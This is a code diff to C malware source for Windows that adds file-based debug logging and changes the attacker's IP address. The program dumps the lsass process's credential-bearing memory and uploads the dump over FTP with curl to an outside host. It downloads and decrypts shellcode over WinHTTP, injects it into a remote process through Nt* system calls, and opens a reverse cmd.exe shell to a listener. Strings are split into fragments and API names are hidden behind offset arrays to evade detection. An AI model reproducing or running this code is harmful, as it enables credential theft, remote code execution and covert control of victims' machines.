@@ -48,8 +48,24 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
     return TRUE;
 }
 
+void debug_log(const char* format, ...) {
+    static FILE* log_file = NULL;
+    
+    if (log_file == NULL) {
+        log_file = fopen("debug.log", "a");
+        if (log_file == NULL) return;
+    }
+    
+    va_list args;
+    va_start(args, format);
+    vfprintf(log_file, format, args);
+    va_end(args);
+    
+    fflush(log_file); // Ensure data is written immediately
+}
+
 int report(){
-	char full_string_2[50];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
+	char full_string_2[100];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
 	char part_string_2_1[] = "\\";
 	char part_string_2_2[] = "??";
 	char part_string_2_3[] = "\\";
@@ -124,7 +140,7 @@ int report(){
 	strcat(full_string_2, part_string_2_35);
 	strcat(full_string_2, part_string_2_36);
 	strcat(full_string_2, part_string_2_37);
-	
+	debug_log("[+] file arg in FTP command -> %s\n",full_string_2);	
     
 	char full_string_1[100];	// innocent.dmp -> remote file name
 	char part_string_1_1[] = "i";
@@ -161,7 +177,7 @@ int report(){
 	strcat(full_string_3, part_string_3_3);
   
   
- 	char full_string_4[100];	// 192.168.8.161
+ 	char full_string_4[100];	// 192.168.100.13
 	char part_string_4_1[] = "1";
 	char part_string_4_2[] = "9";
 	char part_string_4_3[] = "2.";
@@ -169,11 +185,11 @@ int report(){
 	char part_string_4_5[] = "6";
 	char part_string_4_6[] = "8";
 	char part_string_4_7[] = ".";
-	char part_string_4_8[] = "8";
-	char part_string_4_9[] = ".";
-	char part_string_4_10[] = "1";
-	char part_string_4_11[] = "6";
-	char part_string_4_12[] = "1";
+	char part_string_4_8[] = "1";
+	char part_string_4_9[] = "0";
+	char part_string_4_10[] = "0.";
+	char part_string_4_11[] = "1";
+	char part_string_4_12[] = "3";
 	strcpy(full_string_4, part_string_4_1);
 	strcat(full_string_4, part_string_4_2);
 	strcat(full_string_4, part_string_4_3);
@@ -295,13 +311,15 @@ int report(){
 	
 	char curlCommand[512];
 
-	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -k -s
+	//curl --ftp-ssl-reqd -T \\path\\to\\test_ftp_ssl.txt "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -u "ftp_user:123"  -k -s
     snprintf(curlCommand, sizeof(curlCommand),
              "%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
              full_string_8,full_string_7,full_string_2,full_string_3,full_string_4,full_string_5,full_string_1,full_string_9,full_string_6,full_string_10,full_string_11);
-			 
+	
+	debug_log("[+] FTP command -> %s\n",curlCommand);	
     int result;
     do {
+		debug_log("[+] Uploading .dmp file to ftp server\n");
 		result = system(curlCommand);
 	} while (result != 0);
 	
@@ -311,7 +329,7 @@ int report(){
 HMODULE Get_Module(LPCWSTR Module_Name)
 {
 	HMODULE hModule;
-	//printf("[+] Getting Handle to %lu\n", Module_Name);
+	//debug_log("[+] Getting Handle to %lu\n", Module_Name);
 	hModule = GetModuleHandleW(Module_Name);
 	if (hModule == NULL) {
 		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
@@ -378,31 +396,31 @@ int netops(FARPROC h_11_p_open_func,
 	wcscat(full_string_1, part_1_10);
 	wcscat(full_string_1, part_1_11);
 	wcscat(full_string_1, part_1_12);
-	//printf("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
+	//debug_log("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
 	//wprintf(L"%s\n",full_string_1);
 	
 	
 	HINTERNET hSession = h_11_p_open_func(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
 	if (!hSession ){
-		//printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
+		debug_log("[x] WinHttpOpen FAILED %lu\n",GetLastError());
 		return 1;
 	}
-	//printf("[+] WinHttpOpen DONE\n");
+	debug_log("[+] WinHttpOpen DONE\n");
 	
 
 	
-	wchar_t full_string_2[30/2];	// L"192.168.8.161"
+	wchar_t full_string_2[30/2];	// L"192.168.100.13"
 	wchar_t part_2_1[] = L"1";
 	wchar_t part_2_2[] = L"9";
 	wchar_t part_2_3[] = L"2";
 	wchar_t part_2_4[] = L".1";
 	wchar_t part_2_5[] = L"6";
 	wchar_t part_2_6[] = L"8";
-	wchar_t part_2_7[] = L".8";
-	wchar_t part_2_8[] = L".";
-	wchar_t part_2_9[] = L"1";
-	wchar_t part_2_10[] = L"6";
-	wchar_t part_2_11[] = L"1";
+	wchar_t part_2_7[] = L".1";
+	wchar_t part_2_8[] = L"0";
+	wchar_t part_2_9[] = L"0";
+	wchar_t part_2_10[] = L".1";
+	wchar_t part_2_11[] = L"3";
 	//printf("size of 192.168.8.161 -> %d\n",sizeof(L"192.168.8.161"));
 	wcscpy(full_string_2, part_2_1);
 	wcscat(full_string_2, part_2_2);
@@ -423,7 +441,7 @@ int netops(FARPROC h_11_p_open_func,
 	
 	HINTERNET hConnect = h_11_p_conn_func(hSession,full_string_2,8000,0);
 	if ( !hConnect ){
-		//printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
+		debug_log("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
 		return 1;
 		
 	}
@@ -442,11 +460,11 @@ int netops(FARPROC h_11_p_open_func,
 	
 	HINTERNET hRequest = h_11_p_open_req_func(hConnect,full_string_3,full_string_1,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
 	if ( !hRequest ){
-		//printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
+		debug_log("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
 		return 1;
 	}
 	
-	//printf("[+] WinHttpOpenRequest DONE\n");
+	debug_log("[+] WinHttpOpenRequest DONE\n");
 	
 	
 	BOOL bValue;
@@ -455,30 +473,30 @@ int netops(FARPROC h_11_p_open_func,
 		bValue = h_11_p_send_func(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
 		
 	} while (bValue == FALSE);
-	//printf("[+] WinHttpSendRequest DONE\n");
+	debug_log("[+] WinHttpSendRequest DONE\n");
 
 	
 	
 	if ( h_11_p_recv_func(hRequest,NULL) == FALSE ){
-		//printf("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
+		debug_log("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
 		return 1;
 	}
-	//printf("[+] WinHttpReceiveResponse DONE\n");
+	debug_log("[+] WinHttpReceiveResponse DONE\n");
 
 	DWORD dwSize = 0;
     if (!h_11_p_query_func(hRequest, &dwSize)) {
-        //printf("[x] WinHttpQueryDataAvailable FAILED %lu\n", GetLastError());
+        debug_log("[x] WinHttpQueryDataAvailable FAILED %lu\n", GetLastError());
         return 1;
     }
-	//printf("[+] WinHttpQueryDataAvailable DONE\n");
+	debug_log("[+] WinHttpQueryDataAvailable DONE\n");
 	ZeroMemory(magic, sizeof(magic));
 	DWORD dwDownloaded = 0;
-	//printf("[+] BEFORE WinHttpReadData\n");
+	debug_log("[+] BEFORE WinHttpReadData\n");
     if (!h_11_p_read_func(hRequest, (LPVOID)magic, dwSize, &dwDownloaded)) {
-        //printf("[x] WinHttpReadData FAILED %lu\n", GetLastError());
+        debug_log("[x] WinHttpReadData FAILED %lu\n", GetLastError());
         return 1;
     }
-	//printf("[+] WinHttpReadData DONE\n");
+	debug_log("[+] WinHttpReadData DONE\n");
 	
 	
 	//printf("[+] File content: \n%s\n", magic);
@@ -541,7 +559,7 @@ int main_meat(){
 	int wait_for_single_object_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
 	int create_process_A_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26,};
 	int exe_c_C_M_d_offset[] = {2,12,3,62,4,23,4};	//cmd.exe
-	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,60,62,53,58,53}; 	//192.168.8.161
+	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,53,52,52,62,53,55}; 	//192.168.100.13
 	int dll_ws2__32_offset[] = {22,18,54,63,55,54,62,3,11,11};
 	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
 	int dll_n__t_offset[] = {39,45,29,37,37};
@@ -1235,7 +1253,8 @@ int main_meat(){
 		FILE_ATTRIBUTE_NORMAL,
 		NULL
 	);
-	//if (!hDumpFile){printf("[x] Failed to create the file, error: %ld\n",GetLastError());exit(1);}
+	
+	if (!hDumpFile){debug_log("[x] Failed to create the file, error: %ld\n",GetLastError());exit(1);}
 	
 	
 	
@@ -1244,18 +1263,18 @@ int main_meat(){
 	
 	
 	HANDLE hProcess_dmp;
-	//printf("the proc id is --> %d\n",PID);
+	debug_log("the proc id is --> %d\n",PID);
 	// --- START GET PROCESS --- //
 	//printf("[NtOpenProcess] GETTING Process..\n");
 	STATUS = NT_OpenProcess(&hProcess_dmp,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
 	if (STATUS != STATUS_SUCCESS) {
-		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
+		debug_log("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
 		return EXIT_FAILURE;
 	}
-	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
+	debug_log("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess_dmp);
 	// --- END GET PROCESS --- //	
 
-	//if (hProcess == NULL){printf("[x] Failed to get handle to lsass process, error: %ld\n",GetLastError());exit(1);}
+	if (hProcess_dmp == NULL){debug_log("[x] Failed to get handle to lsass process, error: %ld\n",GetLastError());exit(1);}
 	 
 	HPSS snapshot_handle;
 	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
@@ -1293,9 +1312,9 @@ int main_meat(){
 		&CallbackInfo
 	);
 	
-	//if (bProcDump == FALSE){printf("[x] Failed to dump lsass, error: %ld\n",GetLastError());exit(1);}
+	if (bProcDump == FALSE){debug_log("[x] Failed to dump lsass, error: %ld\n",GetLastError());exit(1);}
 	
-	//printf("[+] lsass dumped successfully");
+	debug_log("[+] lsass dumped successfully");
 	
 	CloseHandle(hDumpFile);
 	
@@ -1342,71 +1361,71 @@ INIT_BACKDOOR:
 	decrypt(magic,magic_size,key1);
 	// --- end decryption --- //
 	
-	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
+	debug_log("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
 	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&magic_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
 	if(STATUS != STATUS_SUCCESS){
-		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
+		debug_log("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
 		//goto CLEANUP;
 	}
-	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
+	debug_log("[NtAllocateVirtualMemory] Memory Allocated!\n");
 	
 
 	
-	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
+	debug_log("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
 	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,magic,magic_size,&BytesWritten);
 	if(STATUS != STATUS_SUCCESS){
-		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
-		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,shellcode_size);
+		debug_log("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
+		debug_log("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,magic_size);
 		//goto CLEANUP;
 	}
-	//printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",shellcode_size,BytesWritten);
+	debug_log("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",magic_size,BytesWritten);
 
-	//printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
+	debug_log("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
 	STATUS=NT_ProtectVirtualMemory(hProcess,&Buffer,&magic_size,PAGE_EXECUTE_READ,&OldProtect_MEM);
 	if(STATUS != STATUS_SUCCESS){
-		//printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
+		debug_log("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
 		//goto CLEANUP;
 	}
-	//printf("[NtProtectVirtualMemory] [--X] added!\n");
+	debug_log("[NtProtectVirtualMemory] [--X] added!\n");
 	
 	// --- END MEMORY OPERATIONS --- //
 	
 	
 	// --- START CREATE THREAD --- //
 
-	//printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
+	debug_log("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
 	
 	ObjectAttributes Object_Attr_thread = { sizeof(Object_Attr_thread),NULL };
 	STATUS=NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr_thread,hProcess,Buffer,NULL,FALSE,0,0,0,NULL);
 	if(STATUS != STATUS_SUCCESS){
-		//printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
+		debug_log("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
 		//goto CLEANUP;
 	}
-	//printf("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
+	debug_log("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
 	
 	// --- END CREATE THREAD --- //
 	
 	// --- START WAIT --- //
-	//printf("[0x%p] Waiting to Finish Execution\n",hThread);
-	//STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
-	wait_for_single_object_func(hProcess,INFINITE);
-	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
+	debug_log("[0x%p] Waiting to Finish Execution\n",hThread);
+	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
+	//wait_for_single_object_func(hThread,INFINITE);
+	debug_log("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
 	// --- END WAIT --- //
 
 	
 	while (1){
 		//start winsock 2.2
-		//printf("[+] initializing winsock 2.2\n");
+		debug_log("[+] initializing winsock 2.2\n");
 		if ( wsa_startup_func(MAKEWORD(2,2),&wsaData) != 0 ){
-			//printf("[x] winsock failed, err code: %d\n",WSAGetLastError());
+			//debug_log("[x] winsock failed, err code: %d\n",WSAGetLastError());
 			exit(1);
 		};
 
 		//create socket
-		//printf("[+] creating socket\n");
+		debug_log("[+] creating socket\n");
 		client_socket=wsa_socket_func(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
 		if (client_socket == INVALID_SOCKET){
-			//printf("[x] socket creation failed, err code: %d\n",WSAGetLastError());
+			//debug_log("[x] socket creation failed, err code: %d\n",WSAGetLastError());
 			wsa_cleanup_func();
 			exit(1);
 		
@@ -1417,7 +1436,7 @@ INIT_BACKDOOR:
 		server_addr.sin_port=h_tons_func(_p__0rt);
 		server_addr.sin_addr.s_addr=inet_addr_func(GetOriginal(listener_addr_offset,ALL_ALPHANUM,sizeof(listener_addr_offset)));
 		if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
-			//printf("[x] invalid address\n[x]exiting\n");
+			debug_log("[x] invalid address\n[x]exiting\n");
 			close_sock_func(client_socket);
 			wsa_cleanup_func();
 			exit(1);
@@ -1425,9 +1444,10 @@ INIT_BACKDOOR:
 		};
 
 		//connect to server
-		//printf("[+] connecting to server\n");
+		
 		
 		do{
+			debug_log("[+] connecting to server\n");
 			connect = wsa_connect_func(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
 			
 		} while (connect != 0);
